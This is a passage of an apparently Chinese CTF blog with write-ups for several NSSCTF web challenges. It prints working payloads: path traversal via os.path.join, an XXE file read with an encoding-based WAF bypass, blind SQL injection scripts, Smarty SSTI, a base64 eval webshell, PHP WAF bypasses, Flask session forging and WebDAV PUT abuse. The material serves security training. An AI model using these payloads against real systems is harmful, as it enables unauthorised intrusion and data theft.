class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进行常规的代码审计，发现上传的文件名不能有点，那么上传木马啥的就不存在了，因为解析不了，挺安全的，但我们接着往下看，上传文件后会获得一个uuid并将uuid和filename一起存入数据库，在file目录下可以查询上传的文件，在file函数中有一个重要的利用点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.path.join</span><br></pre></td></tr></table></figure><p>打开uploads目录下的文件并读取内容，然后return。此处存在绝对路径拼接漏洞！！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">绝对路径拼接漏洞</span><br><span class="line"></span><br><span class="line">os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。</span><br><span class="line"></span><br><span class="line">然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</span><br></pre></td></tr></table></figure><p>因此，如果我们上传&#x2F;flag，那么uploads将被删除，直接读取&#x2F;flag下的内容，那就拿捏了！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202091606567.png" alt="image-20241202091606567"></p><p>然后访问file下即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;0aff3bd4-26ba-4b76-bf5c-36bf2eb5e175&#125;</span><br></pre></td></tr></table></figure><h2 id="CSAWQual-2019-Unagi"><a href="#CSAWQual-2019-Unagi" class="headerlink" title="[CSAWQual 2019]Unagi"></a>[CSAWQual 2019]Unagi</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093801748.png" alt="image-20241202093801748" style="zoom: 80%;" /><p>点击here后显示如下：</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093817078.png" alt="image-20241202093817078" style="zoom:67%;" /><p>同时题目告诉我们flag在&#x2F;flag，那么xxe拿捏了。</p><p>上传xml即可，但是上传后发现存在waf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE users [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span><br><span class="line">&lt;users&gt; </span><br><span class="line">  &lt;user&gt;</span><br><span class="line">   &lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">   &lt;password&gt;&amp;xxe;&lt;/password&gt;</span><br><span class="line">   &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">   &lt;email&gt;&amp;xxe;&lt;/email&gt;</span><br><span class="line">   &lt;group&gt;&amp;xxe;&lt;/group&gt;</span><br><span class="line">   &lt;intro&gt;&amp;xxe;&lt;/intro&gt;</span><br><span class="line">  &lt;/user&gt;</span><br><span class="line">&lt;/users&gt; </span><br></pre></td></tr></table></figure><p>那就编码转换一下，简单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f UTF-8 -t UTF-16BE 1.xml &gt; 2.xml</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093953244.png" alt="image-20241202093953244" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;b4784f04-d534-46f9-adee-431ea58cb80a&#125;</span><br></pre></td></tr></table></figure><h2 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h2><p>布尔盲注，这里就简单地贴两个脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28299/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">min</span>&lt;<span class="built_in">max</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url= url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span>=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># buuctf web Hack World</span></span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> right</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28299/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    letf = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> letf &lt; right:</span><br><span class="line">        mid = (letf + right) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            letf = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">if</span> letf != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(letf)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="CISCN-2019华东南-Web11"><a href="#CISCN-2019华东南-Web11" class="headerlink" title="[CISCN 2019华东南]Web11"></a>[CISCN 2019华东南]Web11</h2><p><strong>考点smarty ssti</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113409968.png" alt="image-20241202113409968"></p><p>Smarty模板，不出意外应该就是ssti</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113436817.png" alt="image-20241202113436817"></p><p>ssti确定了</p><blockquote><p>在这里有两个知识点：</p><ol><li>Smarty支持使用{php}{&#x2F;php}标签来执行被包裹其中的php指令</li><li>XFF头代表了HTTP的请求端真实的IP，通过修改XXF头可以实现伪造IP</li></ol></blockquote><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113745659.png" alt="image-20241202113745659"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113809806.png" alt="image-20241202113809806"></p><h2 id="FSCTF-2023-是兄弟，就来传你の🐎！"><a href="#FSCTF-2023-是兄弟，就来传你の🐎！" class="headerlink" title="[FSCTF 2023]是兄弟，就来传你の🐎！"></a>[FSCTF 2023]是兄弟，就来传你の🐎！</h2><p>考察文件上传，对后缀，内容长度，文件头，内容进行了过滤，最终payload如下：</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202120310235.png" alt="image-20241202120310235"></p><blockquote><p>BM与GIF89a一样可以作为文件头，bm是bmp的</p><p>短标签不用闭合！！！</p></blockquote><h2 id="NSSRound-13-Basic-flask-jwt"><a href="#NSSRound-13-Basic-flask-jwt" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?"></a>[NSSRound#13 Basic]flask?jwt?</h2><p>本质上是一道非常简单的session伪造题</p><p>但是在使用脚本时出现了一些问题导致一直报错，这里阐述一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;th3f1askisfunny&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True,&#x27;_i</span><br><span class="line">d&#x27;: &#x27;323e553274b92d78b97cec1e6057e2d1e427da85e1e1d30ab94c690b84cea27289a62d7bfece7c28411e7440095785ba82b839cb6355dad9068</span><br><span class="line">bdd3f73b6aac8&#x27;,&#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><p>要注意的是这里的True不能为true，同时要注意一些空格，值前要有一个空格。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202135053653.png" alt="image-20241202135053653"></p><p>错误示例如上</p><h2 id="GKCTF-2020-CheckIN"><a href="#GKCTF-2020-CheckIN" class="headerlink" title="[GKCTF 2020]CheckIN"></a>[GKCTF 2020]CheckIN</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$decode</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;code = @<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">x</span>()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;decode = @<span class="title function_ invoke__">base64_decode</span>( <span class="variable">$this</span>-&gt;code );</span><br><span class="line">                @<span class="title function_ invoke__">Eval</span>(<span class="variable">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassName</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node4.anna.nssctf.cn:28768?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure><p>搞一个一句话木马就好，放哥斯拉上面</p><p>发现执行不了命令，存在disable_function，可以用插件来绕过</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202141718720.png" alt="image-20241202141718720"></p><h2 id="NCTF-2018-Easy-Audit"><a href="#NCTF-2018-Easy-Audit" class="headerlink" title="[NCTF 2018]Easy_Audit"></a>[NCTF 2018]Easy_Audit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/yulige|flag|nctf/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>])))&#123;         <span class="comment">//日爆md5!!!!!!</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/nctfisfun$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>] !== <span class="string">&#x27;nctfisfun&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag</span> === <span class="string">&#x27;ccc_liubi&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在这里首先对题目进行思路解析：</p><p>要以GET方法接收yulige参数，但是会被过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/yulige|flag|nctf/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]))  die(&#x27;waf..&#x27;);</span><br></pre></td></tr></table></figure><p>$_SERVER[‘QUERY_STRING’]匹配的是问号后的内容，且不会进行url解码，我们可以通过url编码绕过</p><p>但是上面又存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_REQUEST)&#123;</span><br><span class="line">    foreach ($_REQUEST as $key =&gt; $value) &#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))   die(&#x27;waf..&#x27;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这会匹配使对yulige的传参不能有字母，这可不行啊！！</p><p>但是我们可以发现这只是$_REQUEST，如果同时get和post，post优先，会产生变量覆盖。</p><p>然后我们需要关注的就是这里的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>])))&#123;         <span class="comment">//日爆md5!!!!!!</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/nctfisfun$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>] !== <span class="string">&#x27;nctfisfun&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag</span> === <span class="string">&#x27;ccc_liubi&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先要绕过md5的比较，要让自己的前32位强等于自己的md5值，采用数组绕过。因为都为NULL</p><p>然后后面的就太简单了，给出payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28809/?%79%75%6C%69%67%65[]=123&amp;%6E%63%74%66=nnct%66isfun&amp;%66%6C%61%67=data://text/plain,ccc_liubi</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yulige=123&amp;nctf=1&amp;flag=2</span><br></pre></td></tr></table></figure><h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">// Welcome to NSSCTF Round#1 Basic, have fun. </span></span><br></pre></td></tr></table></figure><p>一道奇奇怪怪的题，之前没有见过，除了这个就啥都没有了，目录也什么都扫不到。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\TY&gt;curl -I -X OPTIONS <span class="string">&quot;node4.anna.nssctf.cn:28934/index.php&quot;</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 02 Dec 2024 11:09:33 GMT</span><br><span class="line">Server: Apache/2.4.38 (Debian)</span><br><span class="line">DAV: 1,2</span><br><span class="line">DAV: &lt;http://apache.org/dav/propset/fs/1&gt;</span><br><span class="line">MS-Author-Via: DAV</span><br><span class="line">Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,PUT,LOCK,UNLOCK</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><strong><code>-X OPTIONS</code></strong></p><p><code>-X OPTIONS</code> 指定了请求的方法为 <code>OPTIONS</code>，这是 HTTP 的一种方法，常用于查询服务器支持的 HTTP 方法（如 <code>GET</code>、<code>POST</code>、<code>PUT</code> 等）。</p><p>这条命令的作用是向 <code>node4.anna.nssctf.cn:28934/index.php</code> 发送一个 <code>OPTIONS</code> 请求，并显示响应头。</p><p><strong>再说一下PUT、DELETE请求，PUT、DELETE请求本身最初是用来进行文件管理的，当然这个请求如果为进行鉴权处理的话就会任意执行修改和删除，PUT请求，如果不存在这个路径下的文件，将会创建，如果存在，会执行覆盖操作</strong></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191229996.png" alt="image-20241202191229996" style="zoom:67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191236455.png" alt="image-20241202191236455" style="zoom: 80%;" /><p>拿捏了</p><p>NSSCTF{031e835f-af6a-447d-838d-6d5e5b640e8e}</p><h2 id="GDOUCTF-2023-hate-eat-snake"><a href="#GDOUCTF-2023-hate-eat-snake" class="headerlink" title="[GDOUCTF 2023]hate eat snake"></a>[GDOUCTF 2023]hate eat snake</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192140294.png" alt="image-20241202192140294" style="zoom:50%;" /><p>一道js题目，这种题一般直接给了flag在源码里，但是我找不到。这里刚开始是打不开源码的</p><p>这里可以右键-&gt;检查</p><p>先复制网页url，打开f12，再输入网址打开网页，这样f12就会保留</p><p><a href="https://so.csdn.net/so/search?q=%E7%81%AB%E7%8B%90%E6%B5%8F%E8%A7%88%E5%99%A8&spm=1001.2101.3001.7020">火狐浏览器</a>右边的三横-&gt;更多工具-&gt;开发者工具。</p><p>三种方法打开f12</p><p>接下来分析题目</p><p>这种js的网页，flag一般都是alert给你，那么我们接下来搜一下alert函数</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192401696.png" alt="image-20241202192401696"></p><p>不出意外这就是flag了。前面有个if比较，跟进一下getScore</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192427751.png" alt="image-20241202192427751"></p><p>那么只要让这个return的score值超级大就行，84行打断点然后空格运行游戏</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192500153.png" alt="image-20241202192500153"></p><p>然后来控制台改score的值</p><p><img 